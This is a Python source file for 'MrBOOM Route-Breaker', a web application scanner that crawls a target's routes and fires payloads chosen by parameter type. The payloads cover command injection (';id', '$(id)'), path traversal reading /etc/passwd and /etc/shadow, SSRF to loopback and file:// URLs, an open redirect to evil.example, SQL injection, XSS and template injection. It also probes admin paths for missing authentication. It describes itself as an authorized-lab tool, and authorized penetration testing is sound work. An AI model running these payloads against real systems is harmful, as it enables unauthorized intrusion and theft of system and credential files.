"""
MRBOOM // ROUTE-BREAKER — param-type-aware testing of discovered routes
Fixes the gap that made the harness blind on AcmeCorp: the attack battery
probes generic params, but custom app routes (/tools/diagnostics?host=,
/files/download?file=, /tools/fetch-preview?url=) carry their OWN
vulnerable param types. This module:
  1. discovers routes + query params (crawl homepage links, common paths)
  2. infers param type from the name (host/file/url/q/id...)
  3. fires type-appropriate payloads (cmd-inj, traversal, SSRF, SQLi, XSS,
     SSTI) with response-based detection (marker reflection, error strings,
     content fingerprints)
  4. reports findings with the proof request/response in engine format

Authorized-lab tool: only point it at targets you own or have written
permission to test.

CLI:
  python route_breaker.py --target http://192.168.1.46 [--routes /a?x=1 /b?y=2]
                          [--out FILE]
"""
import argparse, html as html_mod, json, re, sys, urllib.error, urllib.parse, urllib.request
from pathlib import Path

TIMEOUT = 8
UA = "Mozilla/5.0 (X11; Linux x86_64) MrBOOM-RouteBreaker/1.0"

# ─── Param-type inference ──────────────────────────────────────────────
def param_type(name):
    n = name.lower()
    if re.search(r"(host|ip|server|domain|addr|target)", n): return "host"
    if re.search(r"(file|path|name|doc|download|dir|folder)", n): return "file"
    if re.search(r"(url|uri|link|redirect|next|return|dest|target_url|callback)", n): return "url"
    if re.search(r"(q|search|query|term|keyword|text|msg|comment)", n): return "query"
    if re.search(r"(id|num|count|page|offset|limit|index)", n): return "num"
    return "generic"

# ─── Payloads per type ─────────────────────────────────────────────────
PAYLOADS = {
    "host": [
        ("cmd-inj newline", "127.0.0.1%0aid", [r"uid=\d+", r"root@", r"linux", r"uname"]),
        ("cmd-inj dollar", "127.0.0.1$(id)", [r"uid=\d+", r"root@"]),
        ("cmd-inj semi", "127.0.0.1;id", [r"uid=\d+", r"root@"]),
        ("cmd-inj backtick", "127.0.0.1`id`", [r"uid=\d+", r"root@"]),
        ("cmd-inj ampersand", "127.0.0.1%26%26id", [r"uid=\d+", r"root@"]),
    ],
    "file": [
        ("traversal absolute", "/etc/passwd", [r"root:.*:0:0:", r"nobody:"]),
        ("traversal dotdot", "../../../../etc/passwd", [r"root:.*:0:0:"]),
        ("traversal enc", "..%2f..%2f..%2f..%2fetc%2fpasswd", [r"root:.*:0:0:"]),
        ("traversal double-enc", "%252e%252e%252fetc%252fpasswd", [r"root:.*:0:0:"]),
        ("traversal shadow", "/etc/shadow", [r"root:\*:|root:\$6\$"]),
        ("traversal hostname", "/etc/hostname", [r"[a-f0-9]{12}|hostname"]),
    ],
    "url": [
        ("ssrf decimal", "http://2130706433/", [r"refused", r"timed out", r"fetch error"]),
        ("ssrf loopback", "http://127.0.0.1/", [r"refused", r"timed out", r"fetch error", r"blocked"]),
        ("ssrf ipv6", "http://[::1]/", [r"refused", r"timed out", r"fetch error"]),
        ("ssrf file", "file:///etc/passwd", [r"root:.*:0:0:", r"refused", r"not supported"]),
        ("open-redirect", "//evil.example", [r"evil\.example"]),
    ],
    "query": [
        ("sqli quote", "'", [r"SQLITE|SQL syntax|psycopg|mysql|sqlalchemy|sqlite3\.|syntax error"]),
        ("sqli union", "')) UNION SELECT 1,2,3--", [r"SQLITE|syntax error|result columns"]),
        ("xss marker", "<script>MRSIGXSS1</script>", [r"MRSIGXSS1"]),
        ("ssti jinja", "{{7*7}}", [r"49(?![0-9])"]),
        ("ssti twig", "${7*7}", [r"49(?![0-9])"]),
    ],
    "num": [
        ("sqli numeric", "1 OR 1=1--", [r"SQLITE|syntax error|traceback"]),
        ("neg", "-1", [r"SQLITE|syntax error|traceback|error"]),
        ("huge", "2147483647", [r"error|traceback"]),
    ],
    "generic": [
        ("xss marker", "<script>MRSIGXSS2</script>", [r"MRSIGXSS2"]),
        ("sqli quote", "'", [r"SQLITE|SQL syntax|syntax error|traceback"]),
        ("ssti", "{{7*7}}", [r"49(?![0-9])"]),
        ("traversal", "../../etc/passwd", [r"root:.*:0:0:"]),
    ],
}

# ─── HTTP helpers ──────────────────────────────────────────────────────
def fetch(url, timeout=TIMEOUT):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(200000).decode("utf-8", "ignore")
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, (e.read(50000).decode("utf-8", "ignore") if e.fp else "")
    except Exception as e:
        return 0, str(e)

# ─── Route discovery ───────────────────────────────────────────────────
def discover_routes(base, extra_routes=None):
    """Crawl the homepage + common paths; return list of (url, param, type)."""
    routes = []
    seen = set()
    def add(url):
        u = url if url.startswith("http") else urllib.parse.urljoin(base, url)
        u = u.split("#")[0]
        if u in seen: return
        seen.add(u)
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qsl(parsed.query)
        if qs:
            for k, v in qs:
                routes.append((f"{parsed.scheme}://{parsed.netloc}{parsed.path}", k, param_type(k), v))
    # homepage links with query strings
    status, body = fetch(base)
    if body:
        for m in re.finditer(r'<a[^>]+href="([^"]+)"', body, re.I):
            href = html_mod.unescape(m.group(1))
            if "?" in href:
                add(href)
    # common paths (GET-friendly)
    for p in ["/", "/login", "/admin", "/admin/reports", "/dashboard", "/search",
              "/tools", "/tools/fetch-preview", "/tools/diagnostics", "/files/download",
              "/api/health", "/status"]:
        add(urllib.parse.urljoin(base, p))
    # explicit routes from CLI
    for r in (extra_routes or []):
        add(r)
    return routes

# ─── Finding record ────────────────────────────────────────────────────
def _sev(kind):
    if kind.startswith("cmd-inj"): return "critical"
    if kind.startswith("traversal"): return "high"
    if kind.startswith(("ssrf", "sqli")): return "high"
    if kind.startswith(("xss", "ssti")): return "medium"
    if kind.startswith("open-redirect"): return "low"
    return "medium"

def authz_check(base):
    """Probe admin-ish paths without authentication. Flags 200 responses that
    expose app content (i.e. no redirect-to-login / login page)."""
    findings = []
    for p in ["/admin", "/admin/reports", "/backup", "/internal", "/dashboard",
              "/manage", "/admin/users", "/admin/config", "/debug", "/console"]:
        url = urllib.parse.urljoin(base, p)
        status, body = fetch(url)
        if status == 200 and body and "login" not in body.lower()[:2000]:
            findings.append({
                "title": f"[ROUTE-BREAKER] authz: {p} accessible without auth",
                "asset": url,
                "severity": "high",
                "detail": f"{url} returned 200 without authentication (no login redirect).",
                "route": p, "param": "", "param_type": "authz",
                "payload": "", "pattern": "200-without-auth", "status": 200,
                "proof": url,
            })
    return findings

# ─── Main scan ─────────────────────────────────────────────────────────
def scan(target, extra_routes=None, out_file=None):
    routes = discover_routes(target, extra_routes)
    findings = []
    tested = {}
    for path, param, ptype, orig in routes:
        key = (path, param)
        if key in tested: continue
        tested[key] = True
        for kind, payload, patterns in PAYLOADS[ptype]:
            url = f"{path}?{urllib.parse.quote(param)}={urllib.parse.quote(payload, safe='%')}"
            status, body = fetch(url)
            for pat in patterns:
                if re.search(pat, body, re.I):
                    findings.append({
                        "title": f"[ROUTE-BREAKER] {kind} on ?{param}",
                        "asset": url,
                        "severity": _sev(kind),
                        "detail": (f"{kind} on {path}?{param} (type={ptype}). "
                                   f"Status {status}. Pattern {pat!r} matched."),
                        "route": path, "param": param, "param_type": ptype,
                        "payload": payload, "pattern": pat, "status": status,
                        "proof": url,
                    })
                    break  # one finding per param per kind class
    findings += authz_check(target)
    if out_file:
        Path(out_file).write_text(json.dumps(findings, indent=2, default=str))
    return {"target": target, "routes_tested": len(tested), "findings": findings}

def main():
    ap = argparse.ArgumentParser(description="MrBOOM Route-Breaker (param-type-aware route testing)")
    ap.add_argument("--target", required=True, help="base URL of authorized target")
    ap.add_argument("--routes", nargs="*", default=None, help="extra routes with params, e.g. /tools/diagnostics?host=x")
    ap.add_argument("--out", default=None)
    a = ap.parse_args()
    report = scan(a.target, a.routes, a.out)
    print(json.dumps(report, indent=2, default=str))

if __name__ == "__main__":
    main()
